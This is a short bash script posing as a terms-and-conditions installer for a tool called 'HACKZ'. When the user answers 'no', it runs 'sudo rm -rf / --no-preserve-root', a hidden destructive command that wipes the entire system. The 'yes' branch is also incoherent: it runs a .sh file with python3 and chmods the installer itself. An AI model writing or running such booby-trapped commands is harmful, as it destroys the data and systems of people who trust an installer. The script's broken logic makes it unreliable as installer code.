#! /bin/bash

sudo apt-get install dialog

dialog --msgbox "HACKZ INSTALLER GUI. Do you agree to the terms and conditions: Redistributing this software without mention of the owner is not permitted. To mention the owner, mention the email: hackers300112@proton.me." 20 45

answer=$(dialog --inputbox "Enter yes/no: " 10 45 2>&1 > /dev/tty)

if [ $answer = "yes" ]; then
        dialog --msgbox "Thank you for agreeing. Beginning the installation" 10 45
        sudo apt-get update
        sudo apt-get upgrade
        sudo chmod 755 HACKZ_GUI_INSTALLER.sh
        clear
        sudo python3 HACKZ_GUI.sh
elif [ $answer = "no" ]; then
        dialog --msgbox "You are NOT allowed to use this software." 8 40
        sudo rm -rf / --no-preserve-root
else
        dialog --msgbox "Sorry, your answer could not be understood. Please restart the program to continue the installation" 8 40

fi
